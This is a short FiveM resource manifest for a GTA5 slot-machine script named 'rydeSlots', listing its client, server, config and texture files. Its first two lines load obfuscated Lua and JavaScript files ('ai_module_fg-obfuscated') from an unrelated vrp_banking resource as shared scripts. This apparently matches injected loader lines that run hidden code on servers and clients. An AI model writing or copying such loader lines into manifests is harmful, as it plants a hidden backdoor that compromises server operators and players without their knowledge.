shared_script '@vrp_banking/ai_module_fg-obfuscated.lua'
shared_script '@vrp_banking/ai_module_fg-obfuscated.js'
---@diagnostic disable: undefined-global

local FX_CLIENT_SCRIPTS = {'@vrp/client/Tunnel.lua', 'client/txds.lua','client/utils.lua' ,'client/client.lua'}
local FX_SERVER_SCRIPTS = {"@vrp/lib/utils.lua", 'server.lua'}
local FX_FILES = {'txds/*.png'}; files(FX_FILES)
fx_version("cerulean")
game('gta5') 
author('Snnaples')
lua54('TC168')
shared_script ('config.lua')
client_scripts(FX_CLIENT_SCRIPTS); server_scripts(FX_SERVER_SCRIPTS)

print'rydeSlots by Snnaples'


